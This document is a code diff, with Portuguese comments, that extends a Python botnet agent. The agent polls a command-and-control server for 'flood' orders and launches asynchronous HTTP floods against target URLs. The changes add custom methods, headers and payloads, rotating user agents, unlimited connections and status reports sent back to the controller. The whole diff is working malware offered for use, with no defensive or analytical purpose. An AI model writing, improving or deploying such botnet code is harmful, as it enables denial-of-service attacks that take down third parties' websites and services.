@@ -18,8 +18,12 @@ async def send_log(message):
     except Exception:
         pass
 
-async def attack_task(session, target_url):
-    """Realiza uma única requisição HTTP assíncrona"""
+async def attack_task(session, request_config):
+    """Realiza uma requisição HTTP assíncrona com método e headers customizados"""
+    url = request_config.get("url")
+    method = request_config.get("method", "GET").upper()
+    body = request_config.get("body")
+
     headers = {
         "User-Agent": random.choice([
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
@@ -28,55 +32,95 @@ async def attack_task(session, target_url):
         "Connection": "keep-alive",
         "Cache-Control": "no-cache"
     }
+
+    custom_headers = request_config.get("headers")
+    if custom_headers:
+        headers.update(custom_headers)
+
     try:
-        async with session.get(target_url, headers=headers, timeout=5) as response:
-            return response.status
+        if method == "POST":
+            async with session.post(url, headers=headers, data=body, timeout=5) as response:
+                return response.status
+        elif method == "PUT":
+            async with session.put(url, headers=headers, data=body, timeout=5) as response:
+                return response.status
+        else:
+            async with session.get(url, headers=headers, timeout=5) as response:
+                return response.status
     except Exception:
         return None
 
-async def flood_target(target_url, intensity):
-    """Gerencia o lote de requisições assíncronas"""
-    await send_log(f"INICIANDO ATAQUE: {target_url} (Intensidade: {intensity})")
-    
+async def flood_target(requests_list, intensity, attack_id):
+    """Gerencia o lote de requisições assíncronas com múltiplas URLs/payloads"""
+    await send_log(f"INICIANDO ATAQUE (ID: {attack_id}) com {len(requests_list)} requisição(ões) - Intensidade: {intensity}")
+
     connector = aiohttp.TCPConnector(limit=None)
     async with aiohttp.ClientSession(connector=connector) as session:
-        tasks = []
+        requests_successful = 0
+        requests_failed = 0
+
         for _ in range(intensity):
-            tasks.append(asyncio.create_task(attack_task(session, target_url)))
-        
-        if tasks:
-            await asyncio.gather(*tasks)
-    
-    await send_log(f"LOTE FINALIZADO em {target_url}")
+            tasks = []
+            for req_config in requests_list:
+                tasks.append(asyncio.create_task(attack_task(session, req_config)))
+
+            if tasks:
+                results = await asyncio.gather(*tasks)
+                requests_successful += sum(1 for r in results if r and r >= 200 and r < 300)
+                requests_failed += sum(1 for r in results if r is None or r >= 400)
+
+        total_requests = len(requests_list) * intensity
+
+        await send_log(f"ATAQUE CONCLUÍDO (ID: {attack_id}) | Total: {total_requests} | Sucesso: {requests_successful} | Falhas: {requests_failed}")
+
+        return {
+            "attack_id": attack_id,
+            "requests_successful": requests_successful,
+            "requests_failed": requests_failed,
+            "total_requests": total_requests
+        }
 
 # 3. LÓGICA PRINCIPAL (O loop de vida do bot)
 
 async def main():
-    # ... (mantenha o código de registro igual)
-
     print(f"[*] Agente {BOT_ID} online e aguardando ordens...")
 
     while True:
         try:
             response = requests.get(f"{C2_URL}/get_task/{BOT_ID}", timeout=5)
-            
+
             if response.status_code == 200:
                 order = response.json().get("task")
-                
+
                 if order and order.get("action") == "flood":
-                    # 1. Removemos o sleep longo aqui
-                    # 2. Chamamos o ataque de forma que ele mantenha a pressão
-                    target = order.get("target_url")
+                    requests_list = order.get("requests", [])
                     intensity = order.get("intensity", 10)
-                    
-                    # Dispara o ataque e NÃO espera o fim para continuar o loop se quiser pressão máxima
-                    # Ou apenas diminua o sleep drasticamente
-                    await flood_target(target, intensity)
-                    
-                    # Em vez de 3 segundos, esperamos apenas milissegundos
-                    await asyncio.sleep(0.1) 
+                    attack_id = order.get("attack_id")
+
+                    if requests_list:
+                        result = await flood_target(requests_list, intensity, attack_id)
+
+                        try:
+                            requests.post(
+                                f"{C2_URL}/report_attack_status",
+                                json={
+                                    "attack_id": attack_id,
+                                    "requests_sent": result["total_requests"],
+                                    "requests_successful": result["requests_successful"],
+                                    "requests_failed": result["requests_failed"]
+                                },
+                                timeout=2
+                            )
+                            requests.post(
+                                f"{C2_URL}/finish_attack",
+                                json={"attack_id": attack_id},
+                                timeout=2
+                            )
+                        except Exception:
+                            pass
+
+                    await asyncio.sleep(0.1)
                 else:
-                    # Se não tem ordem, aí sim ele dorme para não fritar seu PC
                     await asyncio.sleep(3)
             else:
                 await asyncio.sleep(3)
